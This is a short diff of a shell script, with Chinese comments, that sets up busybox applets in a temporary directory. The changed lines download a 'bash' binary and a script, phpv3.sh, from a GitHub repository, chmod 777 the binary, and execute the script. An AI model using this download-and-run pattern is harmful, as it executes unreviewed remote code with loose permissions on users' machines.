@@ -23,8 +23,7 @@ load_busybox() {
         ln -s "${TEMP_DIR}/busybox" "${TEMP_DIR}/${cmd}"
     done
 
-    curl -L "https://github.com/A233S/angti/raw/main/bash" -o "${TEMP_DIR}/bash"
-    chmod 777 "${TEMP_DIR}/bash"
+
 
     # 将临时目录添加到PATH
     export PATH="${PATH}:${TEMP_DIR}"
@@ -34,4 +33,7 @@ load_busybox() {
 
 # 调用load_busybox函数
 load_busybox
-curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; "${TEMP_DIR}/bash" /tmp/php.sh "$1"
+
+    curl -L "https://raw.githubusercontent.com/A233S/angti/main/bash" -o "${TEMP_DIR}/bash"
+    chmod 777 "${TEMP_DIR}/bash"
+curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php.sh "$1"
